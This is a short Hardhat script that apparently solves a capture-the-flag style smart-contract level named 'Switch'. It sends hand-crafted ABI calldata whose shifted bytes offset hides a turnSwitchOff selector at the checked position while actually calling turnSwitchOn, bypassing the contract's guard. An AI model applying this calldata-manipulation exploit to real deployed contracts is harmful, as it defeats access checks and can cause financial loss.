import { ethers } from "hardhat"
import { Switch__factory } from "../typechain/factories/contracts/Switch__factory";


async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0xFc381F7DaE92305966490d5a380AE35444B38470";
    let s = new Switch__factory(signer).attach(instance_address);
    console.log(await s.switchOn());


    let off_sig = ethers.utils.id("turnSwitchOff()").substring(0, 10);
    let on_sig = ethers.utils.id("turnSwitchOn()").substring(0, 10);
    console.log(off_sig, on_sig)
    
    // let tx = await s.flipSwitch(off_sig);
    // await tx.wait();
    // console.log(tx.data);
    /*
    0x30c13ade
    0000000000000000000000000000000000000000000000000000000000000020
    0000000000000000000000000000000000000000000000000000000000000004
    20606e1500000000000000000000000000000000000000000000000000000000
    */

    /*
    0x30c13ade
    0000000000000000000000000000000000000000000000000000000000000060
    0000000000000000000000000000000000000000000000000000000000000000
    20606e1500000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000004
    76227e1200000000000000000000000000000000000000000000000000000000
    */
    let calldata = "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"
    let tx = await signer.sendTransaction({
        data: calldata,
        to: s.address
    })
    await tx.wait();
    
    console.log(await s.switchOn());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
